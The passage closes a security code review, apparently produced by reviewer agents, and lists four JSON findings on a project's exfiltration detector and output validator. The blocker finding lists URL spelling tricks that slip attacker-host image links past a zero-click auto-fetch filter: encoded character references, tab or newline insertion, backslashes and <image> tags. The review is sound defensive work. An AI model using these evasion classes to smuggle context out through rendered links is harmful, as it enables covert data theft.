  T19 contract restated in the dispatch; all were read directly.
- `ctx_used: yes` — every command, code search, test run and probe execution went through
  `bun src/cli.ts ctx run` / `ctx rg`, except the mutation runs, which execute inside the scratch copy
  (outside the project root, where the routing layer does not apply) and whose results are summarized
  above rather than pasted raw.
- `raw_rg_used: no` — no bare `rg`/`grep`/`cat`/`find` over project code. Bounded `bun -e` readers
  were used to inspect probe JSON in the scratchpad; no `# keryx:raw` escape was needed.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T24R2#F-001",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 144,
    "symbol": "exfilHost",
    "problem": "The auto-fetch classifier recognizes only the literal authority spellings https?:// and //, uses a 26-entry named-character-reference table that omits Tab and NewLine, matches only <img> and not <image>, and applies its new whitespace stripping after extraction regexes that already truncated the destination at the first whitespace. Seventeen URL spellings that a conformant WHATWG URL parser resolves to the attacker host are therefore released unchanged.",
    "impact": "The mandatory no-auto-fetch floor is bypassed for the same class T24 F-004 and T24R#F-002 recorded. The payload reaches the MCP client inside operation JSON with isError:false and redaction.state:\"none\", and reaches durable sinks byte-identical through prepareOutputForPersistence, so rendering it is a zero-click request to an attacker host carrying attacker-encoded context. Advisory redaction was disabled in the probe, so the mandatory floor is what failed.",
    "suggested_fix": "Resolve the decoded, whitespace-stripped candidate with the platform URL parser against a synthetic same-origin base and treat any differing origin as external, instead of pattern-matching the authority; let the whitespace-bearing remainder reach considerUrl by widening the extraction regexes; match <image> alongside <img>; add the HTML5 named references whose decoded character the URL parser removes. Add one regression per class in exfil.test.ts and one at the transport, keeping the four benign controls.",
    "evidence": "T24-recheck2-exfil.ts (48 cases, each adjudicated by a WHATWG URL oracle) reports 17 bypasses and 0 false positives; T24-recheck2-boundary.ts reproduces eight of them at dispatchCallTool as isError:false, state:\"none\", attacker host present, and three of them as allowed:true byte-identical through prepareOutputForPersistence and redactToolOutput.",
    "confidence": "high",
    "dedupe_key": "afc15:exfil:renderer-equivalent-url-classes",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:144",
        "src/security/detect/exfil.ts:34",
        "src/security/detect/exfil.ts:135",
        "src/security/detect/exfil.ts:164",
        "src/security/detect/exfil.ts:192",
        "src/security/detect/exfil.ts:196",
        "src/security/detect/exfil.ts:198",
        "src/security/detect/exfil.ts:201",
        "src/security/detect/exfil.ts:289"
      ],
      "enumeration_method": "Complete read of src/security/detect/exfil.ts, then a 48-case matrix crossing the two axes the code exposes - the character-reference grammar (decimal/hex/named, case, optional semicolon, zero padding, double encoding) and the URL syntax the WHATWG parser accepts or removes (tab/LF/CR, leading C0-or-space, backslash-for-slash, unbounded slash runs, userinfo) - against every extraction surface (INLINE, REFERENCE_DEF, HTML_IMG, HTML_IMG_SRCSET, <image>), each paired with a benign control and adjudicated by a WHATWG URL oracle rather than by inspection."
    }
  },
  {
    "id": "F-002",
    "global_id": "T24R2#F-002",
    "reviewer": "review-logic",
    "severity": "major",
    "file": "src/security/output-validation.ts",
    "line": 563,
    "symbol": "validateSerializedContentForTransport",
    "problem": "When the bytes are not canonically equivalent to the validated structure the canonical re-serialization is substituted, but for an integer literal outside IEEE-754 double range that re-serialization is lossy: {\"n\":12345678901234567890} becomes {\"n\":12345678901234567000}. The rule's stated guarantee that only spelling is normalized does not hold for that case, and -0 becomes 0.",
    "impact": "Integrity rather than confidentiality: a durable sink writes a corrupted identifier (snowflake id, int64 key, epoch in nanoseconds). prepareOutputForPersistence returns only {allowed, content} and discards redaction, so every persistence caller receives the altered value with no signal at all; at the MCP transport the only signal is the reason token serialized-content-normalized, which names a spelling change, not a value change.",
    "suggested_fix": "Compare the token stream rather than the final string, and treat a numeric literal whose re-serialization differs as data loss: either preserve the original bytes for that case (a whitespace- or number-literal-only difference hides no member) or return format-unsafe with a distinct fixed token. At minimum propagate redaction through prepareOutputForPersistence so a persistence caller can see that its bytes were rewritten.",
    "evidence": "T24-recheck2-validator.ts f002.bigIntegerPrecision: input {\"n\":12345678901234567890}, output {\"n\":12345678901234567000}, ok:true, state:\"redacted\", reasons:[\"serialized-content-normalized\"]; f002.negativeZero: {\"n\":-0} to {\"n\":0}. Raw .metaproject/data/gdctx/raw/2026-09-06T14-18-12-601Z_run.log.",
    "confidence": "high",
    "dedupe_key": "afc02:serialized-json:canonicalisation-precision-loss",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/output-validation.ts:563",
        "src/security/output-validation.ts:534",
        "src/security/service.ts:47",
        "src/security/guard.ts:59",
        "src/mcp/redact-seam.ts:31",
        "src/memory/write.ts",
        "src/wiki/service.ts",
        "src/wiki/enrich.ts",
        "src/sac/wiki-owner-writer.ts",
        "src/sac/session-wrap-up.ts",
        "src/gdskills/project-skills.ts",
        "src/metrics/lifecycle.ts"
      ],
      "enumeration_method": "bun src/cli.ts ctx rg \"validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence\" src enumerates the single adapter, its two wrappers and every durable-sink consumer against the current tree; the input class was enumerated by replaying every way JSON.stringify(JSON.parse(x)) can differ from x outside whitespace - number literal spelling, number literal precision, -0, string escape spelling, object key ordering - as a 9-case matrix, of which precision and -0 are the only value-altering members."
    }
  },
  {
    "id": "F-003",
    "global_id": "T24R2#F-003",
    "reviewer": "review-logic",
    "severity": "minor",
    "file": "src/security/output-validation.ts",
    "line": 566,
    "symbol": "SERIALIZED_NORMALIZED_REASON",
    "problem": "A serialized payload whose strings spell non-ASCII characters as \\uXXXX, or whose numbers are spelled 1.0, is not canonically equivalent to its parsed structure, so its bytes are rewritten and the result carries state:\"redacted\" even though nothing sensitive is present and nothing was removed. Producers that do this by default include Python json.dumps with ensure_ascii and Go encoding/json, which escapes < > and & .",
    "impact": "No disclosure and no rejection. A caller that branches on redaction.state (a warning banner, an audit counter, a was-anything-removed check) is told a redaction occurred when none did, and durable artifacts are silently reformatted on every guarded write, perturbing diffs and content hashes. 22 of 2041 real repository JSON files are affected.",
    "suggested_fix": "Split the signal: keep state:\"none\" when the difference is confined to escape spelling and value-preserving number spelling, or introduce a third non-redaction reason such as serialized-content-reserialized so a caller can distinguish removal from reprinting. Amend the T36 note that reads as a byte-preservation claim but measured only the absence of rejections.",
    "evidence": "T24-recheck2-repojson.ts over the whole checkout: {\"filesScanned\":2041,\"bytePreserved\":1969,\"rejected\":0,\"normalizedOnly\":22}. Diffing withoutInsignificantWhitespace(content) against JSON.stringify(JSON.parse(content)) on the normalized files shows the divergence is an em-dash or curly quote written as \\u2014 / \\u2019, and \"coveragePrecision\":1.0; the parsed value is unchanged in every sampled case.",
    "confidence": "high",
    "dedupe_key": "afc02:serialized-json:false-redacted-state-on-reserialization",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": false
  },
  {
    "id": "F-004",
    "global_id": "T24R2#F-004",
    "reviewer": "review-logic",
    "severity": "info",
    "file": "src/security/persistence-sinks.test.ts",
    "line": 108,
    "symbol": "materializer keeps a metric string beside a long digit run allowed and redacted",
    "problem": "The ninth committed regression fails under none of seven single-line inverses of the current code, including the literal inverse of the byte-preservation rule the other five persistence tests pin: its payload takes the state:\"redacted\" early-return branch, so that rule never runs on it. It also near-duplicates the pre-existing test at src/security/persistence-sinks.test.ts:27. T32 disclosed that its failure under their scratch revert was a reconstruction artifact, and that disclosure is confirmed.",
    "impact": "None on correctness - the test is a valid AC5 control and passes. The risk is only bookkeeping: counting it among the nine closures would leave the next round believing a defect is pinned that is not.",
    "suggested_fix": "Keep the test and relabel it in the flow record as an acceptance control rather than a regression, and record that the zero-padding and URL-whitespace defects are pinned by src/security/detect/exfil.test.ts only - the T32 transport tests stay green under both of those mutations.",
    "evidence": "T24-recheck2-mutations.ts, seven single-line mutations in a throwaway rsync copy: baseline 31 pass / 0 fail; M1 fails exactly the property-name MCP test; M2 exactly the $ref-sibling MCP test; M3 and M4 each independently fail the entity/srcset MCP test; M5 fails exactly the five DUPLICATE_MEMBER_SHAPES persistence tests and nothing else; M6 and M7 fail only exfil.test.ts cases.",
    "confidence": "high",
    "dedupe_key": "afc02:regressions:ninth-test-is-a-control",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true
  }
]
```
